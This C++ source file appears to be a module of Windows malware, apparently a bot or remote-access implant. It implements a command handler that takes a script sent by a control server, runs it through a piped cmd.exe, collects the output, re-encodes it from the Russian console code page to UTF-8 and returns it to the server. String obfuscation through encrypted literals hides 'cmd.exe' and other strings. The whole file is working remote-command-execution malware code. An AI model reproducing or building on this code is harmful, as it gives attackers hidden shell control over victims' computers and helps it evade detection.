/*
	ceShellScript.cpp
	Executes shell script via piped cmd.exe
*/

#include <Windows.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"					
#include "..\inc\CryptoStrings.h"		
#include "..\inc\MyStreams.h"
#include "..\inc\DataCallbackManager.h"
#include "..\shared\CommStructures.h"

#include "ceGeneric.h"

#include "ceShellScript.h"


/*
	Converts stream contents from console cp (cp866 for ru) into utf-8,
	replacing original stream's contents
*/
VOID _cshMakeUtf8(MY_STREAM *mStream)
{
	LPWSTR wszResBuff = NULL;	// resulting buffer with utf-16
	LPSTR szUtf8 = NULL;	//
	DWORD dwResBuffLen;	// len of ^
	DWORD dwWCharsCount;	// amount of chars written into 
	DWORD dwUtf8Bytes;	// amount of bytes written to szUtf8

	if (!mStream || !mStream->lDataLen) { DbgPrint("ERR: invalid input params"); return; }

	do { // not a loop

		dwResBuffLen = mStream->lDataLen * 4;
		if (!(wszResBuff = (LPWSTR)my_alloc(dwResBuffLen))) { DbgPrint("ERR: failed to alloc %u bytes(1)", dwResBuffLen); break; }
		if (!(szUtf8 = (LPSTR)my_alloc(dwResBuffLen))) { DbgPrint("ERR: failed to alloc %u bytes(2)", dwResBuffLen); break; }

		// do conversion
		if (!(dwWCharsCount = MultiByteToWideChar(CP_OEMCP, 0, (LPCSTR)mStream->pData, mStream->lDataLen, wszResBuff, dwResBuffLen / 2))) { DbgPrint("ERR: (1) conv failed, le %p", GetLastError()); break; }
		if (!(dwUtf8Bytes = WideCharToMultiByte(CP_UTF8, 0, wszResBuff, dwWCharsCount, szUtf8, dwResBuffLen, NULL, NULL))) { DbgPrint("ERR: (2) conv failed, le %p", GetLastError()); break; }

		// conversions were ok if got here, replace contents of stream
		mStream->lDataLen = 0;
		mStream->msWriteStream(mStream, szUtf8, dwUtf8Bytes);

	} while (FALSE); // not a loop

	// free buffers
	if (wszResBuff) { my_free(wszResBuff); }
	if (szUtf8) { my_free(szUtf8); }

}


// arch-independent
BOOL cmdShellScript(DISPATCHER_CALLBACK_PARAMS *dcp)
{
	SERVER_COMMAND *sCommand = (SERVER_COMMAND *)dcp->pInBuffer;	// command + payload ptr
	CREATEPROCESS_PARAMS cpParams;	// for a _cmdSafeExec() call
	EXEC_ERROR_CODE seError = ERR_EXEC_OK;	// error code returned from _cmdSafeExec()
	MY_STREAM msStream = { 0 };	// stream to accumulate resulting script output

	DWORD dwWritten = 0;	// amount of bytes written to stdout
	LPSTR szExitCmd;	// decrypted exit cmd

	DWORD dwBytesAvail;	// amount of data present in pipe
	LPVOID pTmpBuffer = NULL;	// tmp buffer to read data from pipe

	BOOL bError = FALSE;	// set to true to exit due to error from 2 while() loops

	// buffer with resulting script
	LPVOID pCmdScript;
	DWORD dwCmdScriptLen;

	// max empty turns counter, when nothing was detected in pipe
	DWORD dwEmptyTurns = 0;	

	LPWSTR wszS;	// decrypt buffer

	DbgPrint("entered");

	memset(&cpParams, 0, sizeof(CREATEPROCESS_PARAMS));

	do {	// not a loop

		// check if script passed
		if (!sCommand->dwPayloadSize) { cmFormAnswerSpecificErr(dcp, ERR_EMPTY_SHELLSCRIPT, 0); DbgPrint("ERR: empty script passed"); break; }

		// create pipes to be assigned to cmd process for in-out
		if (!_cmdCreateStdPipes(&cpParams)) { cmFormAnswerSpecificErr(dcp, ERR_CREATEPIPES_FAIL, -1); DbgPrint("ERR: _cmdCreateStdPipes() failed"); break; }

		// set run params
		cpParams.wszCmdline = CRSTRW("cmd.exe", "\x00\xe0\xb0\x0f\x07\xe0\xb3\x0a\x14\xb6\x55\xff\xf5\xd8\x78");
		cpParams.emExecMethod = EEM_CREATEPROCESS;

		// forms error result internally
		if (!_cmdSafeExec(&cpParams, &seError)) { cmFormAnswerSpecificErr(dcp, seError, cpParams.dwLastError); DbgPrint("ERR: _cmdSafeExec() failed, code %u, le %p", (DWORD)seError, cpParams.dwLastError);  break; }

		// init resulting data stream
		msInitStream(&msStream);


		// prepare resulting command - existent + exit cmd
		dwCmdScriptLen = sCommand->dwPayloadSize + 6;
		pCmdScript = my_alloc(dwCmdScriptLen + 1024);
		memcpy(pCmdScript, (LPVOID)((SIZE_T)sCommand + sizeof(SERVER_COMMAND)), sCommand->dwPayloadSize);
		szExitCmd = CRSTRA("\nexit\n", "\xfd\x5f\x59\x06\xfb\x5f\x33\x0b\xf5\x4e\xad\x84\x91\x18\x0c");
		memcpy((LPVOID)((SIZE_T)pCmdScript + sCommand->dwPayloadSize), szExitCmd, 6);
		my_free(szExitCmd);

		DbgPrint("about to write %u bytes to stdin", dwCmdScriptLen);
		DbgPrint("script=[%s]", pCmdScript);

		// write command data to stdin
		if (!WriteFile(cpParams.hStdInWrite, pCmdScript, dwCmdScriptLen, &dwWritten, NULL)) { cmFormAnswerSpecificErr(dcp, ERR_STDIN_WRITE_FAILED, -1); DbgPrint("ERR: WriteFile() failed"); break; }

		DbgPrint("written %u bytes of %u", dwWritten, dwCmdScriptLen);

		// calling this may lead to deadlock
		//DbgPrint("flushing..");
		//FlushFileBuffers(cpParams.hStdInWrite);
		//DbgPrint("flush done");

		// init tmp buffer
		pTmpBuffer = my_alloc(10240);

		// while have data in stream & process still alive, do read into stream
		// for error exit from outer loop too, use bError flag
		do {

			// check for data waiting to be read in pipe
			dwBytesAvail = 0;
			DbgPrint("peek in");
			if (!PeekNamedPipe(cpParams.hStdOutRead, NULL, 0, NULL, &dwBytesAvail, NULL)) { cmFormAnswerSpecificErr(dcp, ERR_PEEKPIPE_FAILED, -1);  DbgPrint("ERR: PeekNamedPipe() failed"); bError = TRUE; break; }
			DbgPrint("peek out, dwBytesAvail=%u", dwBytesAvail);

			if (dwBytesAvail) {

				DbgPrint("dwBytesAvail=%u", dwBytesAvail);

				dwEmptyTurns = 0;

				// have some data, copy it via tmp buffer
				dwBytesAvail = 0;
				if (ReadFile(cpParams.hStdOutRead, pTmpBuffer, (10240 / 2) - 2, &dwBytesAvail, NULL)) {

					DbgPrint("read=%u", dwBytesAvail);
					msStream.msWriteStream(&msStream, pTmpBuffer, dwBytesAvail);

				} else { DbgPrint("WARN: ReadFile() failed, err %p", GetLastError()); }

			} else { DbgPrint("waiting.."); Sleep(500); dwEmptyTurns++; }

			// check for dwEmptyTurns limit
			if (dwEmptyTurns > 50 * 2) {

				DbgPrint("run limit exceeded, terminating process");

				wszS = CRSTRW("\nERR: run limit", "\xfd\x3f\x6d\x03\xf2\x3f\x07\x2e\xdf\x15\xd7\xab\x1f\xd2\xa3\x8b\x21\xee\xc0\xa2\x59\x4f\x45");
				msStream.msWriteStream(&msStream, wszS, 15 * 2);
				my_free(wszS);
				TerminateProcess(cpParams.pi.hProcess, 0);
				break;

			}

		} while ((WAIT_TIMEOUT == WaitForSingleObject(cpParams.pi.hProcess, 0)) || (!dwBytesAvail));

		// as done, assign result, if no other error detected
		if (bError) { break; }

		DbgPrint("OK: success with read all, total result len %u", msStream.lDataLen);

		// convert from cp866/console into utf-8
		_cshMakeUtf8(&msStream);

		// prepare ok answer
		cmFormAnswer(dcp, CER_OK, msStream.pData, msStream.lDataLen);


	} while (FALSE);	// not a loop

	if (pTmpBuffer) { my_free(pTmpBuffer); }

	// free stream
	if (msStream.pData) { msStream.msFreeStream(&msStream); }

	// close process handles
	if (cpParams.pi.hProcess) { CloseHandle(cpParams.pi.hProcess); }
	if (cpParams.pi.hThread) { CloseHandle(cpParams.pi.hThread); }

	// free pipes
	if (cpParams.hStdOutRead) { _cmdFreeStdPipes(&cpParams); }

	// all done, free mem used
	if (cpParams.wszApplication) { my_free(cpParams.wszApplication); }

	// should always return TRUE in order to stop sending this cmd to other callbacks
	return TRUE;
}
